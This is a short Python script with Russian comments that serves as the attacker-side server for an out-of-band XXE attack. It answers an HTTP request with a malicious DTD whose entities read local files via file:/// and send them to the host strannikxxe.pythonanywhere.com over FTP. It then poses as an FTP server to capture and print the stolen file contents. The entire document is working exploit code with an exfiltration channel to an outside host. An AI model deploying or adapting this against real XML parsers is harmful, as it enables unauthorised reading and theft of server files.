#!/usr/env/python
# coding: utf-8
from __future__ import print_function
import socket


HOST = 'strannikxxe.pythonanywhere.com'
PORT = 9091

# DTD, которую сервер выдаст в ответ на любой запрос
dtd = '''<!ENTITY % data SYSTEM "file:///">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'ftp://{}:{}/%data;'>">'''.format(HOST, PORT)
print(dtd)
# Создаем сокет и биндим его на все интерфейсы на указанный порт
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('',PORT))
s.listen(1)
print('->  waiting')
conn,addr = s.accept()  # ждем входящего HTTP-соединения
print('->  HTTP-connection accepted')

# После установления соединения читаем данные
# (они нам не нужны, но прочитать требуется) и в ответ высылаем DTD,
# прикидываясь HTTP-сервером
data = conn.recv(1024)
conn.sendall('HTTP/1.1 200 OK\r\nContent-length: {len}\r\n\r\n{dtd}'.format(len=len(dtd), dtd=dtd))
print('->  DTD sent')
conn.close()



conn,addr = s.accept()  # ждем входящего FTP-соединения
print('->  FTP-connection accepted')

conn.sendall('220 FTP\r\n')  # представляемся FTP-сервером

stop = False
while not stop:
  data = str(conn.recv(1024))  # читаем команды от клиента

  # когда клиент сообщает имя пользователя – просим пароль,
  # чтобы корректно имитировать процедуру аутентификации
  if data.startswith('USER'):
    conn.sendall('331 password please\r\n')

  # команда RETR как раз будет содержать извлекаемое содержимое файла
  elif data.startswith('RETR'):
    print('->  RETR command received, extracted data:')
    print('-'*30)
    print(data.split(' ', 1)[-1])
    stop = True

  elif data.startswith('QUIT'):  # останавливаемся, если клиент просит
    stop = True

  # в других случаях просим дополнительные данные
  else:
    conn.sendall('230 more data please\r\n')

conn.close()
s.close()
